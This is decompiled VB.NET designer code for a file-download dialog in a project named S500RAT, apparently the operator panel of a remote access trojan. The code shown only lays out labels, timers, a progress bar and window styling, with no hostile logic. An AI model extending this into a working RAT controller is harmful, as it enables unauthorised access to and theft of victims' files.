Namespace S500RAT
	' Token: 0x02000019 RID: 25
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class FormDownloadFile
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x06000283 RID: 643 RVA: 0x00014D88 File Offset: 0x00012F88
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				Dim flag As Boolean = disposing AndAlso Me.components IsNot Nothing
				If flag Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x06000284 RID: 644 RVA: 0x00014DD8 File Offset: 0x00012FD8
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.S500RAT.FormDownloadFile))
			Me.labelfile = New Global.System.Windows.Forms.Label()
			Me.labelsize = New Global.System.Windows.Forms.Label()
			Me.label3 = New Global.System.Windows.Forms.Label()
			Me.Timer1 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.Guna2AnimateWindow1 = New Global.Guna.UI2.WinForms.Guna2AnimateWindow(Me.components)
			Me.NameForm = New Global.Sunny.UI.UILabel()
			Me.ClientInfo = New Global.System.Windows.Forms.Label()
			Me.ProgressBar1 = New Global.Guna.UI2.WinForms.Guna2ProgressBar()
			Me.Label2 = New Global.System.Windows.Forms.Label()
			Me.DownloadLogs = New Global.System.Windows.Forms.LinkLabel()
			Me.Timer2 = New Global.System.Windows.Forms.Timer(Me.components)
			Me.Guna2BorderlessForm1 = New Global.Guna.UI2.WinForms.Guna2BorderlessForm(Me.components)
			Me.Guna2DragControl1 = New Global.Guna.UI2.WinForms.Guna2DragControl(Me.components)
			Me.Mini = New Global.S500RAT.ValleyMini()
			Me.ExitForm = New Global.S500RAT.ValleyClose()
			MyBase.SuspendLayout()
			Me.labelfile.AutoSize = True
			Me.labelfile.Location = New Global.System.Drawing.Point(63, 74)
			Me.labelfile.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.labelfile.Name = "labelfile"
			Me.labelfile.Size = New Global.System.Drawing.Size(13, 14)
			Me.labelfile.TabIndex = 1
			Me.labelfile.Text = ".."
			Me.labelsize.AutoSize = True
			Me.labelsize.ForeColor = Global.System.Drawing.Color.White
			Me.labelsize.Location = New Global.System.Drawing.Point(63, 98)
			Me.labelsize.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.labelsize.Name = "labelsize"
			Me.labelsize.Size = New Global.System.Drawing.Size(13, 14)
			Me.labelsize.TabIndex = 2
			Me.labelsize.Text = ".."
			Me.label3.AutoSize = True
			Me.label3.ForeColor = Global.System.Drawing.Color.Silver
			Me.label3.Location = New Global.System.Drawing.Point(27, 74)
			Me.label3.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.label3.Name = "label3"
			Me.label3.Size = New Global.System.Drawing.Size(32, 14)
			Me.label3.TabIndex = 3
			Me.label3.Text = "File :"
			Me.Timer1.Enabled = True
			Me.Timer1.Interval = 200
			Me.Guna2AnimateWindow1.AnimationType = Global.Guna.UI2.WinForms.Guna2AnimateWindow.AnimateWindowType.AW_BLEND
			Me.Guna2AnimateWindow1.TargetForm = Me
			Me.NameForm.AutoSize = True
			Me.NameForm.BackColor = Global.System.Drawing.Color.Transparent
			Me.NameForm.Font = New Global.System.Drawing.Font("Microsoft YaHei", 9.75F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.NameForm.ForeColor = Global.System.Drawing.Color.White
			Me.NameForm.Location = New Global.System.Drawing.Point(21, 9)
			Me.NameForm.Name = "NameForm"
			Me.NameForm.Size = New Global.System.Drawing.Size(21, 19)
			Me.NameForm.Style = Global.Sunny.UI.UIStyle.Custom
			Me.NameForm.TabIndex = 304
			Me.NameForm.Text = "--"
			Me.NameForm.TextAlign = Global.System.Drawing.ContentAlignment.MiddleLeft
			Me.ClientInfo.AutoSize = True
			Me.ClientInfo.BackColor = Global.System.Drawing.Color.Transparent
			Me.ClientInfo.Font = New Global.System.Drawing.Font("Microsoft YaHei", 8.25F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.ClientInfo.ForeColor = Global.System.Drawing.Color.FromArgb(141, 152, 172)
			Me.ClientInfo.Location = New Global.System.Drawing.Point(22, 35)
			Me.ClientInfo.Name = "ClientInfo"
			Me.ClientInfo.Size = New Global.System.Drawing.Size(18, 16)
			Me.ClientInfo.TabIndex = 305
			Me.ClientInfo.Text = "--"
			Me.ProgressBar1.BackColor = Global.System.Drawing.Color.Transparent
			Me.ProgressBar1.BorderColor = Global.System.Drawing.Color.White
			Me.ProgressBar1.BorderRadius = 5
			Me.ProgressBar1.FillColor = Global.System.Drawing.Color.FromArgb(26, 31, 55)
			Me.ProgressBar1.ForeColor = Global.System.Drawing.Color.White
			Me.ProgressBar1.GradientMode = Global.System.Drawing.Drawing2D.LinearGradientMode.Horizontal
			Me.ProgressBar1.Location = New Global.System.Drawing.Point(25, 123)
			Me.ProgressBar1.Name = "ProgressBar1"
			Me.ProgressBar1.ProgressColor = Global.System.Drawing.Color.FromArgb(255, 128, 0)
			Me.ProgressBar1.ProgressColor2 = Global.System.Drawing.Color.FromArgb(0, 192, 0)
			Me.ProgressBar1.ShadowDecoration.Parent = Me.ProgressBar1
			Me.ProgressBar1.ShowPercentage = True
			Me.ProgressBar1.Size = New Global.System.Drawing.Size(616, 22)
			Me.ProgressBar1.TabIndex = 309
			Me.ProgressBar1.TextRenderingHint = Global.System.Drawing.Text.TextRenderingHint.SystemDefault
			Me.Label2.AutoSize = True
			Me.Label2.ForeColor = Global.System.Drawing.Color.Silver
			Me.Label2.Location = New Global.System.Drawing.Point(23, 98)
			Me.Label2.Margin = New Global.System.Windows.Forms.Padding(2, 0, 2, 0)
			Me.Label2.Name = "Label2"
			Me.Label2.Size = New Global.System.Drawing.Size(36, 14)
			Me.Label2.TabIndex = 311
			Me.Label2.Text = "Size :"
			Me.DownloadLogs.Anchor = (Global.System.Windows.Forms.AnchorStyles.Bottom Or Global.System.Windows.Forms.AnchorStyles.Left)
			Me.DownloadLogs.AutoSize = True
			Me.DownloadLogs.LinkColor = Global.System.Drawing.Color.White
			Me.DownloadLogs.Location = New Global.System.Drawing.Point(27, 130)
			Me.DownloadLogs.Name = "DownloadLogs"
			Me.DownloadLogs.Size = New Global.System.Drawing.Size(0, 14)
			Me.DownloadLogs.TabIndex = 468
			Me.Timer2.Enabled = True
			Me.Timer2.Interval = 1000
			Me.Guna2BorderlessForm1.AnimateWindow = True
			Me.Guna2BorderlessForm1.BorderRadius = 30
			Me.Guna2BorderlessForm1.ContainerControl = Me
			Me.Guna2BorderlessForm1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.DragStartTransparencyValue = 0.6
			Me.Guna2BorderlessForm1.ShadowColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2BorderlessForm1.TransparentWhileDrag = True
			Me.Guna2DragControl1.ContainerControl = Me
			Me.Guna2DragControl1.DockForm = True
			Me.Guna2DragControl1.DockIndicatorColor = Global.System.Drawing.Color.FromArgb(56, 37, 200)
			Me.Guna2DragControl1.DragMode = Global.Guna.UI2.WinForms.Enums.DragMode.Control
			Me.Guna2DragControl1.DragStartTransparencyValue = 0.6
			Me.Guna2DragControl1.TargetControl = Me
			Me.Guna2DragControl1.TransparentWhileDrag = True
			Me.Guna2DragControl1.UseTransparentDrag = True
			Me.Mini.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.Mini.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.Mini.Location = New Global.System.Drawing.Point(602, 12)
			Me.Mini.Name = "Mini"
			Me.Mini.Size = New Global.System.Drawing.Size(20, 20)
			Me.Mini.TabIndex = 592
			Me.Mini.Text = "ValleyMini1"
			Me.ExitForm.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.ExitForm.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.ExitForm.Location = New Global.System.Drawing.Point(628, 12)
			Me.ExitForm.Name = "ExitForm"
			Me.ExitForm.Size = New Global.System.Drawing.Size(20, 20)
			Me.ExitForm.TabIndex = 590
			Me.ExitForm.Text = "ValleyClose1"
			MyBase.AutoScaleDimensions = New Global.System.Drawing.SizeF(96F, 96F)
			MyBase.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Dpi
			Me.BackColor = Global.System.Drawing.Color.FromArgb(7, 11, 41)
			MyBase.ClientSize = New Global.System.Drawing.Size(660, 159)
			MyBase.Controls.Add(Me.Mini)
			MyBase.Controls.Add(Me.ExitForm)
			MyBase.Controls.Add(Me.DownloadLogs)
			MyBase.Controls.Add(Me.Label2)
			MyBase.Controls.Add(Me.ProgressBar1)
			MyBase.Controls.Add(Me.NameForm)
			MyBase.Controls.Add(Me.ClientInfo)
			MyBase.Controls.Add(Me.labelfile)
			MyBase.Controls.Add(Me.labelsize)
			MyBase.Controls.Add(Me.label3)
			Me.Font = New Global.System.Drawing.Font("Arial", 8.25F, Global.System.Drawing.FontStyle.Bold)
			Me.ForeColor = Global.System.Drawing.Color.White
			MyBase.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			MyBase.Icon = CType(componentResourceManager.GetObject("$this.Icon"), Global.System.Drawing.Icon)
			MyBase.Name = "FormDownloadFile"
			Me.Text = "FormDownloadFile"
			MyBase.TopMost = True
			MyBase.ResumeLayout(False)
			MyBase.PerformLayout()
		End Sub

		' Token: 0x04000123 RID: 291
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
